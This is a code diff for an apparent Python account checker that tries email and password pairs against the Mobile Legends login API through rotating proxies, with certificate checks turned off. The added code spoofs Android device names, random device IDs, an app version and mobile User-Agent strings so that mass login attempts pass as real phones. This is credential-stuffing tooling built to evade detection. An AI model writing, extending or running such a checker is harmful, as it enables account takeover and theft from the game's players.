@@ -24,6 +24,7 @@ results = {
 with open("proxies.txt", "r") as f:
     proxies = [p.strip() for p in f if p.strip()]
 
+# Proxy formatter
 def get_proxy_url():
     raw = random.choice(proxies)
     ip, port, user, pwd = raw.split(":")
@@ -33,6 +34,22 @@ async def get_async_client():
     proxy_url = get_proxy_url()
     transport = httpx.AsyncHTTPTransport(proxy=proxy_url, verify=False)
     return httpx.AsyncClient(transport=transport, timeout=httpx.Timeout(10.0))
+
+# Device info generator
+def generate_device_info():
+    devices = [
+        ("Xiaomi Redmi Note 10", "11"),
+        ("Samsung Galaxy A32", "12"),
+        ("Oppo A53", "11"),
+        ("Realme 7i", "10"),
+        ("Vivo Y20", "11"),
+        ("Poco X3", "12"),
+        ("Samsung Galaxy S9", "10"),
+        ("OnePlus Nord", "13"),
+    ]
+    device, android_version = random.choice(devices)
+    device_id = str(random.randint(100000000000000, 999999999999999))  # 15 digits
+    return device, android_version, device_id
 
 async def get_profile(access_token, user_id):
     url = "https://accountmtapi.mobilelegends.com/Account/profile"
@@ -56,9 +73,23 @@ async def get_profile(access_token, user_id):
     return 0, "Unknown", []
 
 async def check_account(email, password):
+    device, android_version, device_id = generate_device_info()
+
     login_url = "https://accountmtapi.mobilelegends.com/Account/login"
-    data = {"email": email, "password": password, "os_type": 2, "format": 2, "secret": ""}
-    headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    data = {
+        "email": email,
+        "password": password,
+        "os_type": 2,
+        "format": 2,
+        "secret": "",
+        "device": device,
+        "device_id": device_id,
+        "app_version": "1.7.82.811.1",  # Update if MLBB updates
+    }
+    headers = {
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": f"Mozilla/5.0 (Linux; Android {android_version}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36"
+    }
 
     for _ in range(3):
         try:
